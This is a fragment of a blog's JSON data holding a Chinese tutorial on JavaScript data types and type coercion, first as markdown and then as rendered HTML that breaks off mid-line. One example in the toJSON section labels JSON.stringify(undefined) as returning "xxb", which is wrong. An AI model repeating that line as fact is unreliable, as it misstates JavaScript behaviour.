运算符即能用于数字加法，也能用于字符串拼接， `+` 运算符也能是一元运算符，将后面的操作数转换为数字\n\nES5 规范定义：如果某个操作数是字符串或者能够通过以下步骤转换为字符串的话，+ 将进行拼接操作。如果其中一个操作数是对象（包括数组），则首先对其调用 `ToPrimitive` 抽象操作，该抽象操作再调用 `[[DefaultValue]]` ，以数字作为上下文。\n\n> 其中一个操作数是字符串（或者通过 `ToPrimitive` 得到字符串），则执行字符串拼接，否则执行数字加法\n\n```js\nvar a = {\n  valueOf: function () {\n    return 42;\n  },\n  toString: function () {\n    return 4;\n  }\n};\na + \"\"; // \"42\"\nString(a); // \"4\"\n\n// a + \"\" 会对 a 调用 valueOf() 方法，然后通过 ToString 抽象操作将返回值转换为字符串。\n// String(a) 则是直接调用 ToString()\n```\n\n```js\n[1, 2] + [3, 4] // '1,23,4'\n42 + '' // '42'\n\n[] + {} // '[object Object]'\n{ } +[] // 0 `{}` 被当做代码块\n\n  + '42' // 42\n'42' - 0 // 42\n'42' - '12' // 32\n\n[32] - [21] // 11\n  [32] - [2, 1] // NaN\n```\n\n##### 隐式强制转换为 Number\n\n```js\n// boolean 转换为 number\n// 也可使用 Number(boolean) 进行隐式转换\nfunction booleanToNum() {\n  let sum = 0;\n  for (let i = 0; i < arguments.length; i++) {\n    if (arguments[i]) {\n      sum += 1;\n    }\n  }\n  return sum;\n}\nbooleanToNum(true, false, true)\n```\n\n##### 隐式强制转换为Boolean\n\n下面的情况会发生隐式强制类型 Boolean 转换：\n1. if (..) 语句中的条件判断表达式。\n2. for ( .. ; .. ; .. ) 语句中的条件判断表达式（第二个）。\n3. while (..) 和 do..while(..) 循环中的条件判断表达式。\n4. ? :中的条件判断表达式。\n5. 逻辑运算符 || （逻辑或）和 && （逻辑与）左边的操作数（作为条件判断表达式）。\n\n```js\nvar a = 42;\nvar b = \"abc\";\nvar c;\nvar d = null;\nif (a) {\n  console.log(\"yep\"); // yep\n}\nwhile (c) {\n  console.log(\"nope, never runs\");\n}\nc = d ? a : b;\nc; // \"abc\"\nif ((a && d) || c) {\n  console.log(\"yep\"); // yep\n}```\n\n","source":"_posts/JavaScript/数据类型与类型转换.md","raw":"---\ntitle: 数据类型与类型转换\ncategories: JavaScript\ntags: [JavaScript 原理]\ndate: 2021-01-27 12:32:18\n---\n\n### 1、数据类型\n\n八种数据类型：`null` 、 `undefined` 、 `boolean` 、 `number` 、 `string` 、 `symbol`、`bigint` 和 `object`\n\n```js\ntypeof undefined === 'undefined'; // true\ntypeof true === 'boolean'; // true\ntypeof 42 === 'number'; // true\ntypeof '42' === 'string'; // true\ntypeof { life: 42 } === 'object'; // true\ntypeof [1] === 'object'; // true\n\n// 历史遗留问题\ntypeof null === 'object'; // true\n\n// ES6中新加入的类型\ntypeof Symbol() === 'symbol'; // true\ntypeof 12n === 'bigint' // true\n```\n\n##### 1.1 类型判断\n\n###### 1.1.1 typeof\n\ntypeof 命令可以判断 Undefined, Boolean, String, Number, Symbol, BigInt 等基本数据类型，但无法判断 Null，Object, Array 等对象类型\n\n```js\ntypeof null === 'object'; // true\ntypeof {} === 'object'; // true\ntypeof [] === 'object'; // true\n```\n\n###### 1.1.2 instanceof （不推荐使用）\n\n适合用于判断自定义的类实例对象, 而不是用来判断原生的数据类型，会有一些问题，不推荐使用\n\n实质上是通过 constructor 字段来判断的，会逐层的在原型链上查找\n\n> iframe 之间不会共享原型链，通过 iframe 传值时，使用 instanceof 会有问题\n\n```js\nvar arr = []\narr instanceof Array // true\narr instanceof Object // true\n```\n\n###### 1.1.3 Object.prototype.toString() （推荐使用）\n\nObject.prototype.toString 方法, 可以获取到变量的准确的类型\n\n> `Object.prototype.toString` 的原理是当调用的时候, 就取值内部的 `[[Class]]` 属性值, 然后拼接成 `'[object ' + [[Class]] + ']'` 这样的字符串并返回\n\n```js\nconst fn = () => {};\nconst toString = Object.prototype.toString;\n\ntoString.call(undefined); // [object Undefined]\ntoString.call(null); // [object Null]\ntoString.call(true); // [object Boolean]\ntoString.call(1);  // [object Number]\ntoString.call(NaN); // [object Number]\ntoString.call('1'); // [object String]\ntoString.call(fn);  // [object Function]\ntoString.call([1,2,3]); // [object Array]\n\n```\n\n```js\n// 实现 typeof 函数判断所有数据类型\nconst typeOf = (obj) => {\n  const regex = /\\[object\\s(.+)]/;\n  const objStr = Object.prototype.toString.call(obj);\n  const res = objStr.match(regex);\n  console.log(res);\n\n  if (!res || !res[1]) throw new Error('typeof error');\n\n  return res[1].toLowerCase();\n}\n```\n\n###### 1.1.4 其他 API \n\n**Array.isArray()** 用于判断某个数据是否为数组，\n\npolyfill 实现如下：\n```js\nArray.isArray = Array.isArray || function(array){\n  return Object.prototype.toString.call(array) === '[object Array]';\n}\n```\n\n**Number.isNaN()** 方法确定传递的值是否为 `NaN`，并且检查其类型是否为 `Number`。\n\npolyfill 实现如下：\n```js\nNumber.isNaN = Number.isNaN || function(value) {\n    return typeof value === \"number\" && isNaN(value);\n}\n```\n\n**isNaN()** 方法用来确定一个值是否为 `NaN`，因为 `NaN !== NaN`\n\n> 将某些不能强制转换为数值的非数值转换为数值，或者算术运算返回一个未定义的或无法表示的值，会得到 `NaN`\n> 如果 `isNaN` 函数的参数不是 Number 类型， `isNaN` 函数会首先尝试将这个参数转换为数值，然后才会对转换后的结果是否是 `NaN` 进行判断，推荐使用 **Number.isNaN()**\n\n```js\nvar isNaN = function(value) {\n    var n = Number(value);\n    return n !== n;\n};\n```\n\n\n### 1.2 undefined 与 undeclared\n* 未被声明的变量，如 `b`，调用时报错 `ReferenceError: b is not defined`\n* 已被声明但未赋值的变量，如 `let a`， 直接调用时输出 `undefined`\n* `typeof` 有一个特殊的安全防范机制，变量未被声明时也返回 `undefined`\n\n```js\nconst { log } = console\nvar a;\n\nlog(a); // undefined\nlog(b); // ReferenceError: b is not defined\nlog(typeof a); // undefined\nlog(typeof b); // undefined\n```\n\n##### 1.3 机器精度\n\n比较两个浮点数最常见的方法是设置一个误差范围值，通常称为“机器精度”，对 JavaScript 的数字来说，这个值通常是 `2^-52` (2.220446049250313e-16) 。\n\n```js\n// 为 ES6 之前的版本写 polyfill\nif (!Number.EPSILON) {\n  Number.EPSILON = Math.pow(2, -52);\n}\n\nfunction numbersCloseEnoughToEqual(n1,n2) {\n  return Math.abs( n1 - n2 ) < Number.EPSILON;\n}\nvar a = 0.1 + 0.2;\nvar b = 0.3;\nnumbersCloseEnoughToEqual(a, b); // true\nnumbersCloseEnoughToEqual(0.0000001, 0.0000002); // false\n```\n\n```js\n// Q: 去数值的整数部分和小数部分\n\n// A: 使用 parseInt\n// 不推荐使用，不准确 & 性能问题\nvar a = 3.5\nparseInt(a) // 3\n\nvar b = 0.0000000000001 // 1e-13\nparseInt(b) // 1\n\n// A: 使用 Math.ceil()、Math.floor()\nfunction trunc(num) {\n  if(num >= 0) return Math.floor(num);\n  return Math.ceil(num);\n}\n\ntrunc(3.75); // 3\ntrunc(-3.75); // -3\n\n// A: 使用 % 运算\nconsole.log(3.75 % 1); // 0.75\nconsole.log(-3.75 % 1); // -0.75\n\n// A: 使用位运算\nconsole.log(~~3.75); // 3\nconsole.log(~~-3.75); // -3\n```\n\n##### todo: 取整数部分和小数部分\n\n### 2、对象、字符串、数字和布尔值之间类型转换规则\n\n##### 2.1 内部属性 [[class]]\n \n所有 `typeof` 返回值为 `\"object\"` 的对象都包含一个内部属性 `[[Class]]` （看作一个内部的分类），这个属性无法直接访问，一般通过 `Object.prototype.toString()` 来查看\n\n```js\nconst toString = Object.prototype.toString;\n\ntoString.call(null); // [object Null]\ntoString.call(undefined); // [object Undefined]\ntoString.call(true); // [object Boolean]\ntoString.call([]); // [object Array]\n```\n\n##### 2.2 toStringTag\n\n`Symbol.toStringTag` 是一个内置 `symbol`，它通常作为对象的属性键使用，对应的属性值应该为字符串类型，这个字符串用来表示该对象的自定义类型标签，通常只有内置的 `Object.prototype.toString()` 方法会去读取这个标签并把它包含在自己的返回值里。\n\n许多内置的 JavaScript 对象类型即便没有 `toStringTag` 属性，也能被 `toString()` 方法识别并返回特定的类型标签，比如：\n\n```js\nObject.prototype.toString.call('foo');     // \"[object String]\"\nObject.prototype.toString.call([1, 2]);    // \"[object Array]\"\nObject.prototype.toString.call(3);         // \"[object Number]\"\nObject.prototype.toString.call(true);      // \"[object Boolean]\"\nObject.prototype.toString.call(undefined); // \"[object Undefined]\"\nObject.prototype.toString.call(null);      // \"[object Null]\"\n// ... and more\n```\n\n另外一些对象类型则不然，`toString()` 方法能识别它们是因为引擎为它们设置好了 `toStringTag` 标签：\n\n```js\nObject.prototype.toString.call(new Map());       // \"[object Map]\"\nObject.prototype.toString.call(function* () {}); // \"[object GeneratorFunction]\"\nObject.prototype.toString.call(Promise.resolve()); // \"[object Promise]\"\n// ... and more\n```\n\n但你自己创建的类不会有这份特殊待遇，`toString()` 找不到 `toStringTag` 属性时只好返回默认的 Object 标签：\n\n```js\nclass ValidatorClass {}\n\nObject.prototype.toString.call(new ValidatorClass()); // \"[object Object]\"\n```\n\n加上 `toStringTag` 属性，你的类也会有自定义的类型标签了：\n\n```js\nclass ValidatorClass {\n  get [Symbol.toStringTag]() {\n    return \"Validator\";\n  }\n}\n\nObject.prototype.toString.call(new ValidatorClass()); // \"[object Validator]\"\n```\n\n##### 2.3 ToPrimitive 抽象操作\n\n`ToPrimitive(input, PreferredType)` 是JavaScript引擎内部的抽象操作，原理如下：\n可选参数 `PreferredType` 可以是 `Number` 或者 `String`，它只代表了一个转换的偏好，转换结果不一定必须是这个参数所指的类型，但转换结果一定是一个原始值。\n\n`PreferredType` 被标志为 `Number` 时：\n1. 如果输入的值已经是个原始值，则直接返回它\n2. 如果输入的值是一个对象，则调用该对象的 `valueOf()` 方法，如果 `valueOf()` 方法的返回值是一个原始值，则返回这个原始值\n3. 否则，调用这个对象的 `toString() `方法，如果 `toString()` 方法的返回值是一个原始值，则返回这个原始值\n4. 否则，抛出 TypeError 异常\n\n`PreferredType` 被标志为 `String` 时转换规则类似，不同的是先调用 `toString()` 方法，再调用 `valueOf() `方法\n\n> 如果没有 PreferredType 参数，则 PreferredType 的值会按照这样的规则来自动设置：Date 类型的对象会被设置为 String，其它类型的值会被设置为 Number（先调用 valueOf）\n\n```js\nvar obj = {\n   valueOf () {\n      console.log('valueOf');\n      return {};\n   },\n   toString () {\n      console.log('toString');\n      return {};\n   },\n}\n\nNumber(obj);\n// valueOf\n// toString\n// TypeError: Cannot convert object to primitive value\n\nString(obj);\n// toString\n// valueOf\n// TypeError: Cannot convert object to primitive value\n```\n\n| 类型 | valueOf() | toString() |\n| --- | --- | --- |\n| Boolean\t| true 或 false\t| 'true'或者 'false'\n| Number |\t数值 |\t数值的字符串形式 |\n| String |\t返回该对象表示的字符串值 |\t返回该对象表示的字符串值 |\n| Object |\t返回该对象 |\t'[object Object]' |\n| Array |\t返回该数组 |\t以,分割的字符串，类似Array.join(',') |\n| Date |\t返回日期的毫秒数 |\t返回带有时区信息的日期和时间 |\n| RegExp |\t返回该正则函数 |\t返回正则表达式字面量 |\n| Function |\t返回该函数 |\t将函数代码以字符串形式返回 |\n\n### 3 类型转换\n\n##### 3.1 ToNumber\nnumber 转换规则：\n* `true` 转换为 `1`\n* `false` 转换为 `0` ，\n* `undefined` 转换为 `NaN` \n* `null` 转换为 `0`\n* 字符串转为数字\n\n为了将值转换为相应的基本类型值，抽象操作 `ToPrimitive` 会首先检查该值是否有 `valueOf()` 方法，如果有并且返回基本类型值，就使用该值进行强制类型转换。如果没有就使用 `toString()` 的返回值（如果存在）来进行强制类型转换，否则会产生 `TypeError` 错误。\n\n```js\nvar a = {\n  valueOf() {\n    return \"42\";\n  }\n};\nvar b = {\n  toString() {\n    return \"42\";\n  }\n};\nvar c = [4, 2];\nc.toString = function () {\n  return this.join(\"\");\n};\nNumber(a); // 42\nNumber(b); // 42\nNumber(c); // 42\nNumber(\"\"); // 0\nNumber([]); // 0\nNumber([\"abc\"]); // NaN\n```\n\n\n##### 3.2 ToString\n字符串化规则： \n* `null` 转换为 `\"null\"`\n* `undefined` 转换为 `\"undefined\"`\n* `true` 转换为 `\"true\"`，\n* 数字转换为普通字符串（较大或较小数值使用指数形式）\n* 普通对象使用 `toString()` （ `Object.prototype.toString()` ）返回内部属性 `[[Class]]` 的值，如 `\"[object Object]\"`。\n\n> 如果对象有自己的 toString() 方法，字符串化时就会调用该方法并使用其返回值\n> 数组的默认 toString() 方法经过了重新定义，将所有单元字符串化以后再用 \",\" 连接\n\n```js\nvar num = '123456789';\nvar flag = true;\nvar n = null;\nvar u = undefined;\nvar obj = { name: 'xxb' };\nvar obj2 = {\n  name: 'xxb',\n  toString() {\n    return this.name + '-------';\n  }\n}\nvar arr = [1, 2, 3];\nvar error = new Error('123');\n\nnum.toString(); // 123456789\nflag.toString(); // true\nn + ''; // null\nu + ''; // undefined\nobj.toString(); // [object Object]\nobj2.toString(); // xxb-------\narr.toString(); // 1,2,3\nerror.toString(); // Error: 123\n```\n\n##### 3.3 ToBoolean\n`undefined`、`null`、`false`、`+0` 、` -0` 和 `NaN`、`\"\"` 将转换为 `false`，其他值转换为 `true`\n\n> 所有的对象都会转换为 true，包括{}、new Boolean(false)、new Number(0)、new String('')\n\n```js\n!! null // false\n!! '' // false\n!!NaN // false\n!!new Boolean(false) // true\n!!new Number(0); // true\n!!new String(\"\"); // true\n!! \"false\"; // true\n!! \"0\"; // true\n!! \"''\"; // true\n!!{}; // true\n```\n\n字符串和数字之间的转换是通过 String(..) 和 Number(..) 这两个内建函数（原生构造函数，参见第 3 章）来实现的，请注意它们前面没有 new 关键字，并不创建封装对象。\n~ 和 indexOf() 一起可以将结果强制类型转换（实际上仅仅是转换）为真 / 假值\n~ 比 >= 0 和 == -1 更简洁\n\n##### 3.4 JSON 字符串化\n\n1. 字符串、数字、布尔值和 `null` 的 `JSON.stringify()` 规则与 `ToString` 基本相同。\n2. 如果传递给 `JSON.stringify()` 的对象中定义了 `toJSON()` 方法，那么该方法会在字符串化前调用，以便将对象转换为安全的 JSON 值。\n\n所有安全的 JSON 值都可以使用 `JSON.stringify()` 字符串化。\n\n> 不安全的 JSON 值指 undefined 、 function 、 symbol和包含循环引用的对象，JSON.stringify() 在对象中遇到 undefined 、 function 和 symbol 时会自动将其忽略，在数组中则会返回 null （以保证单元位置不变）\n\n如果对象中定义了 toJSON() 方法，JSON 字符串化时会首先调用该方法，然后用它的返回值来进行序列化。如果要对含有非法 JSON 值的对象做字符串化，或者对象中的某些值无法被序列化时，就需要定义 toJSON() 方法来返回一个安全的 JSON 值。\n\n> toJSON() 返回的应该是一个适当的值，可以是任何类型，然后再由 JSON.stringify() 对其进行字符串化\n\n```js\nJSON.stringify(undefined); // undefined\nJSON.stringify(function(){}); // undefined\nJSON.stringify([1, undefined, function(){}, 4]); // \"[1,null,null,4]\"\nJSON.stringify({ a:2, b:function(){}}); // \"{\"a\":2}\"\n\nvar obj = {\n   name: 'xxb',\n   age: 24,\n   toJSON () {\n      return this.name;\n   }\n}\nJSON.stringify(undefined); // \"xxb\"\n```\n\n### 4 隐式转换\n\n##### 4.1 隐式强制转换为 String\n\n`+` 运算符即能用于数字加法，也能用于字符串拼接， `+` 运算符也能是一元运算符，将后面的操作数转换为数字\n\nES5 规范定义：如果某个操作数是字符串或者能够通过以下步骤转换为字符串的话，+ 将进行拼接操作。如果其中一个操作数是对象（包括数组），则首先对其调用 `ToPrimitive` 抽象操作，该抽象操作再调用 `[[DefaultValue]]` ，以数字作为上下文。\n\n> 其中一个操作数是字符串（或者通过 `ToPrimitive` 得到字符串），则执行字符串拼接，否则执行数字加法\n\n```js\nvar a = {\n  valueOf: function () {\n    return 42;\n  },\n  toString: function () {\n    return 4;\n  }\n};\na + \"\"; // \"42\"\nString(a); // \"4\"\n\n// a + \"\" 会对 a 调用 valueOf() 方法，然后通过 ToString 抽象操作将返回值转换为字符串。\n// String(a) 则是直接调用 ToString()\n```\n\n```js\n[1, 2] + [3, 4] // '1,23,4'\n42 + '' // '42'\n\n[] + {} // '[object Object]'\n{ } +[] // 0 `{}` 被当做代码块\n\n  + '42' // 42\n'42' - 0 // 42\n'42' - '12' // 32\n\n[32] - [21] // 11\n  [32] - [2, 1] // NaN\n```\n\n##### 隐式强制转换为 Number\n\n```js\n// boolean 转换为 number\n// 也可使用 Number(boolean) 进行隐式转换\nfunction booleanToNum() {\n  let sum = 0;\n  for (let i = 0; i < arguments.length; i++) {\n    if (arguments[i]) {\n      sum += 1;\n    }\n  }\n  return sum;\n}\nbooleanToNum(true, false, true)\n```\n\n##### 隐式强制转换为Boolean\n\n下面的情况会发生隐式强制类型 Boolean 转换：\n1. if (..) 语句中的条件判断表达式。\n2. for ( .. ; .. ; .. ) 语句中的条件判断表达式（第二个）。\n3. while (..) 和 do..while(..) 循环中的条件判断表达式。\n4. ? :中的条件判断表达式。\n5. 逻辑运算符 || （逻辑或）和 && （逻辑与）左边的操作数（作为条件判断表达式）。\n\n```js\nvar a = 42;\nvar b = \"abc\";\nvar c;\nvar d = null;\nif (a) {\n  console.log(\"yep\"); // yep\n}\nwhile (c) {\n  console.log(\"nope, never runs\");\n}\nc = d ? a : b;\nc; // \"abc\"\nif ((a && d) || c) {\n  console.log(\"yep\"); // yep\n}```\n\n","slug":"JavaScript/数据类型与类型转换","published":1,"updated":"2021-06-01T11:40:56.734Z","_id":"cko3yr62o0005io6r8j3081p7","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"1、数据类型\"><a href=\"#1、数据类型\" class=\"headerlink\" title=\"1、数据类型\"></a>1、数据类型</h3><p>八种数据类型：<code>null</code> 、 <code>undefined</code> 、 <code>boolean</code> 、 <code>number</code> 、 <code>string</code> 、 <code>symbol</code>、<code>bigint</code> 和 <code>object</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typeof</span> <span class=\"literal\">undefined</span> === <span class=\"string\">&#x27;undefined&#x27;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> <span class=\"literal\">true</span> === <span class=\"string\">&#x27;boolean&#x27;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> <span class=\"number\">42</span> === <span class=\"string\">&#x27;number&#x27;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> <span class=\"string\">&#x27;42&#x27;</span> === <span class=\"string\">&#x27;string&#x27;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> &#123; <span class=\"attr\">life</span>: <span class=\"number\">42</span> &#125; === <span class=\"string\">&#x27;object&#x27;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> [<span class=\"number\">1</span>] === <span class=\"string\">&#x27;object&#x27;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 历史遗留问题</span></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> <span class=\"literal\">null</span> === <span class=\"string\">&#x27;object&#x27;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ES6中新加入的类型</span></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> <span class=\"built_in\">Symbol</span>() === <span class=\"string\">&#x27;symbol&#x27;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> <span class=\"number\">12n</span> === <span class=\"string\">&#x27;bigint&#x27;</span> <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"1-1-类型判断\"><a href=\"#1-1-类型判断\" class=\"headerlink\" title=\"1.1 类型判断\"></a>1.1 类型判断</h5><h6 id=\"1-1-1-typeof\"><a href=\"#1-1-1-typeof\" class=\"headerlink\" title=\"1.1.1 typeof\"></a>1.1.1 typeof</h6><p>typeof 命令可以判断 Undefined, Boolean, String, Number, Symbol, BigInt 等基本数据类型，但无法判断 Null，Object, Array 等对象类型</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typeof</span> <span class=\"literal\">null</span> === <span class=\"string\">&#x27;object&#x27;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> &#123;&#125; === <span class=\"string\">&#x27;object&#x27;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> [] === <span class=\"string\">&#x27;object&#x27;</span>; <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n\n<h6 id=\"1-1-2-instanceof-（不推荐使用）\"><a href=\"#1-1-2-instanceof-（不推荐使用）\" class=\"headerlink\" title=\"1.1.2 instanceof （不推荐使用）\"></a>1.1.2 instanceof （不推荐使用）</h6><p>适合用于判断自定义的类实例对象, 而不是用来判断原生的数据类型，会有一些问题，不推荐使用</p>\n<p>实质上是通过 constructor 字段来判断的，会逐层的在原型链上查找</p>\n<blockquote>\n<p>iframe 之间不会共享原型链，通过 iframe 传值时，使用 instanceof 会有问题</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = []</span><br><span class=\"line\">arr <span class=\"keyword\">instanceof</span> <span class=\"built_in\">Array</span> <span class=\"comment\">// true</span></span><br><span class=\"line\">arr <span class=\"keyword\">instanceof</span> <span class=\"built_in\">Object</span> <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n\n<h6 id=\"1-1-3-Object-prototype-toString-（推荐使用）\"><a href=\"#1-1-3-Object-prototype-toString-（推荐使用）\" class=\"headerlink\" title=\"1.1.3 Object.prototype.toString() （推荐使用）\"></a>1.1.3 Object.prototype.toString() （推荐使用）</h6><p>Object.prototype.toString 方法, 可以获取到变量的准确的类型</p>\n<blockquote>\n<p><code>Object.prototype.toString</code> 的原理是当调用的时候, 就取值内部的 <code>[[Class]]</code> 属性值, 然后拼接成 <code>&#39;[object &#39; + [[Class]] + &#39;]&#39;</code> 这样的字符串并返回</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> fn = <span class=\"function\">() =&gt;</span> &#123;&#125;;</span><br><span class=\"line\"><span class=\"keyword\">const</span> toString = <span class=\"built_in\">Object</span>.prototype.toString;</span><br><span class=\"line\"></span><br><span class=\"line\">toString.call(<span class=\"literal\">undefined</span>); <span class=\"comment\">// [object Undefined]</span></span><br><span class=\"line\">toString.call(<span class=\"literal\">null</span>); <span class=\"comment\">// [object Null]</span></span><br><span class=\"line\">toString.call(<span class=\"literal\">true</span>); <span class=\"comment\">// [object Boolean]</span></span><br><span class=\"line\">toString.call(<span class=\"number\">1</span>);  <span class=\"comment\">// [object Number]</span></span><br><span class=\"line\">toString.call(<span class=\"literal\">NaN</span>); <span class=\"comment\">// [object Number]</span></span><br><span class=\"line\">toString.call(<span class=\"string\">&#x27;1&#x27;</span>); <span class=\"comment\">// [object String]</span></span><br><span class=\"line\">toString.call(fn);  <span class=\"comment\">// [object Function]</span></span><br><span class=\"line\">toString.call([<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]); <span class=\"comment\">// [object Array]</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 实现 typeof 函数判断所有数据类型</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> typeOf = <span class=\"function\">(<span class=\"params\">obj</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> regex = <span class=\"regexp\">/\\[object\\s(.+)]/</span>;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> objStr = <span class=\"built_in\">Object</span>.prototype.toString.call(obj);</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = objStr.match(regex);</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(res);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!res || !res[<span class=\"number\">1</span>]) <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">&#x27;typeof error&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res[<span class=\"number\">1</span>].toLowerCase();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"1-1-4-其他-API\"><a href=\"#1-1-4-其他-API\" class=\"headerlink\" title=\"1.1.4 其他 API\"></a>1.1.4 其他 API</h6><p><strong>Array.isArray()</strong> 用于判断某个数据是否为数组，</p>\n<p>polyfill 实现如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Array</span>.isArray = <span class=\"built_in\">Array</span>.isArray || <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">array</span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">Object</span>.prototype.toString.call(array) === <span class=\"string\">&#x27;[object Array]&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>Number.isNaN()</strong> 方法确定传递的值是否为 <code>NaN</code>，并且检查其类型是否为 <code>Number</code>。</p>\n<p>polyfill 实现如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Number</span>.isNaN = <span class=\"built_in\">Number</span>.isNaN || <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">value</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">typeof</span> value === <span class=\"string\">&quot;number&quot;</span> &amp;&amp; <span class=\"built_in\">isNaN</span>(value);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>isNaN()</strong> 方法用来确定一个值是否为 <code>NaN</code>，因为 <code>NaN !== NaN</code></p>\n<blockquote>\n<p>将某些不能强制转换为数值的非数值转换为数值，或者算术运算返回一个未定义的或无法表示的值，会得到 <code>NaN</code><br>如果 <code>isNaN</code> 函数的参数不是 Number 类型， <code>isNaN</code> 函数会首先尝试将这个参数转换为数值，然后才会对转换后的结果是否是 <code>NaN</code> 进行判断，推荐使用 <strong>Number.isNaN()</strong></p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"built_in\">isNaN</span> = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">value</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> n = <span class=\"built_in\">Number</span>(value);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> n !== n;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"1-2-undefined-与-undeclared\"><a href=\"#1-2-undefined-与-undeclared\" class=\"headerlink\" title=\"1.2 undefined 与 undeclared\"></a>1.2 undefined 与 undeclared</h3><ul>\n<li>未被声明的变量，如 <code>b</code>，调用时报错 <code>ReferenceError: b is not defined</code></li>\n<li>已被声明但未赋值的变量，如 <code>let a</code>， 直接调用时输出 <code>undefined</code></li>\n<li><code>typeof</code> 有一个特殊的安全防范机制，变量未被声明时也返回 <code>undefined</code></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> &#123; log &#125; = <span class=\"built_in\">console</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> a;</span><br><span 